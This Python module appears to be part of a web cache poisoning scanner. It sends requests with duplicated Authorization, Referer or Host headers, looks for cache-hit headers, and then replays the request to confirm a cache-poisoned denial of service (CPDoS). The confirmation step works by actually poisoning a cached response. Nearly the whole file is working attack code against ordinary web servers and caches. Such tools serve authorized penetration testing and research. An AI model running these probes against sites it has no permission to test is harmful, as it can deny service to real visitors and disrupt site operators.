import http.client
from urllib.parse import urlparse
from modules.utils import requests, configure_logger, random

VULN_NAME = "Multiple Headers"

logger = configure_logger(__name__)

def verify_cache_poisoning(VULN_TYPE, conn, url, payload, main_status_code, authent, host):
    cb = random.randrange(9999)
    res_status = 0

    try:
        for _ in range(5):
            conn.putrequest("GET", "/?CPDoS={}".format(cb))
            conn.putheader("User-Agent", "xxxx")
            if VULN_TYPE == "ADH":
                conn.putheader("Authorization", "xxxx")
                conn.putheader("Authorization", "xxxx")

            elif VULN_TYPE == "RDH":
                conn.putheader("Referer", "xy")
                conn.putheader("Referer", "x")

            elif VULN_TYPE == "HDH":
                conn.putheader("Host", "{}".format(host))
                conn.putheader("Host", "toto.com")

            conn.endheaders()
            response = conn.getresponse()
            res_status = response.status
            conn.close()
        #print(url)
        uri = f"{url}?CPDoS={cb}"
        #print(uri)
        req =  requests.get(uri, auth=authent, timeout=10)
        if req.status_code == res_status and res_status != main_status_code:
            reason = f"DIFFERENT STATUS-CODE  {main_status_code} > {response.status}"
            print(
                f" \033[31m└── [VULNERABILITY CONFIRMED]\033[0m | {VULN_NAME} | \033[34m{uri}\033[0m | {reason} | PAYLOAD: {payload}"
            )
    except Exception as e:
        logger.exception(e)


def authorization_duplicate_headers(conn, url, main_status_code, authent):
    VULN_TYPE = "ADH"
    cb = random.randrange(9999)

    try:
        conn.putrequest("GET", "/?cb={}".format(cb))
        conn.putheader("User-Agent", "xxxx")
        conn.putheader("Authorization", "xxxx")
        conn.putheader("Authorization", "xxxx")
        conn.endheaders()

        response = conn.getresponse()

        if response.status != main_status_code and response.status not in [200, 301, 302, 403, 404, 307, 308]:
            #print(f"[{url}?cb={cb}] Statut : {response.status}, Raison : {response.reason}")
            for rh in response.headers:
                if "age" in rh.lower() or "hit" in rh.lower():
                    return response, cb
        else:
            conn.close()
            return False
    except Exception as e:
        return False
        
        

def referer_duplicate_headers(conn, url, main_status_code, authent):
    VULN_TYPE = "RDH"
    cb = random.randrange(9999)

    try:
        conn.putrequest("GET", "/?cb={}".format(cb))
        conn.putheader("User-Agent", "xxxx")
        conn.putheader("Referer", "xy")
        conn.putheader("Referer", "x")
        conn.endheaders()

        response = conn.getresponse()
        if response.status != main_status_code and response.status not in [200, 301, 302, 403, 404, 307, 308]:
            #print(f"[{url}?cb={cb}] Statut : {response.status}, Raison : {response.reason}")
            for rh in response.headers:
                if "age" in rh.lower() or "hit" in rh.lower():
                    return response, cb
        else:
            conn.close()
            return False
    except Exception as e:
        return False
        


def host_duplicate_headers(conn, host, url, main_status_code, authent):
    VULN_TYPE = "HDH"
    cb = random.randrange(9999)

    try:
        conn.putrequest("GET", "/?cb={}".format(cb))
        conn.putheader("User-Agent", "xxxx")
        conn.putheader("Host", "{}".format(host))
        conn.putheader("Host", "toto.com")
        conn.endheaders()

        response = conn.getresponse()
        if response.status != main_status_code and response.status not in [200, 301, 302, 403, 404, 307, 308]:
            #print(f"[{url}?cb={cb}] Statut : {response.status}, Raison : {response.reason}")
            for rh in response.headers:
                if "age" in rh.lower() or "hit" in rh.lower():
                    return response, cb
        else:
            conn.close()
            return False
    except Exception as e:
        return False
        


def MHC(url, req_main, authent):
    main_status_code = req_main.status_code
    try:
        parsed_url = urlparse(url)
        host = parsed_url.netloc
        if parsed_url.scheme == "https":
            conn = http.client.HTTPSConnection(host, timeout=10)
        else:
            conn = http.client.HTTPConnection(host, timeout=10)

        ADH = authorization_duplicate_headers(conn, url, main_status_code, authent)
        RDH = referer_duplicate_headers(conn, url, main_status_code, authent)
        HDH = host_duplicate_headers(conn, host, url, main_status_code, authent)

        mhc_res = ["ADH", "RDH", "HDH"]

        for vuln_type in mhc_res:
            print(f" \033[34m {VULN_NAME} : {url}\033[0m\r", end="")
            print("\033[K", end="")
            vuln_type_res = locals()[vuln_type]
            if vuln_type_res != False and vuln_type_res != None:
                behavior = f"DIFFERENT STATUS-CODE  {main_status_code} > {vuln_type_res[0].status}"

                if vuln_type == "ADH":
                    payload = f"[Authorization: xxx, Authorization: xxx]"
                elif vuln_type == "RDH":
                    payload = f"[Referer: xy, Referer: x]"
                elif vuln_type == "HDH":
                    payload = f"[Host: {host}, Host: toto.com]"

                print(
                        f" \033[33m└── [INTERESTING BEHAVIOR]\033[0m | {VULN_NAME} | \033[34m{url}?cb={vuln_type_res[1]}\033[0m | {behavior} | PAYLOAD: {payload}"
                    )
                conn.close()
                verify_cache_poisoning(vuln_type, conn, url, payload, main_status_code, authent, host)

    except Exception as e:
        logger.exception(e)
